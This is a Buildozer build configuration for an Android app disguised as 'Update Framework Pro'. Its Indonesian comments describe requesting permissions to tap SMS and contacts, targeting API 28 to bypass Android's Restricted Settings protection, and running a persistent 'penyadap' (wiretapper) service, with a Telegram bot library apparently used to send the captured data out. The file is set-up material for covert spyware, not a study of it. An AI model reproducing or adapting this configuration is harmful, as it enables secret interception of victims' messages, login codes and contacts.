[app]
title = Update Framework Pro
package.name = core_system_v3
package.domain = com.core.internal
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 3.5

# Library wajib untuk Telegram dan Android
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius,requests,certifi

# Izin Sadap SMS, Kontak, dan Notifikasi
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED, READ_CONTACTS

# API 28 untuk bypass keamanan Restricted Settings
android.api = 28
android.minapi = 21
android.ndk = 25b
android.private_storage = True

# Service agar tetap jalan meski aplikasi ditutup
services = penyadap:service.py

# Arsitektur HP modern
android.archs = arm64-v8a, armeabi-v7a
android.allow_backup = True

[buildozer]
log_level = 2
warn_on_root = 1
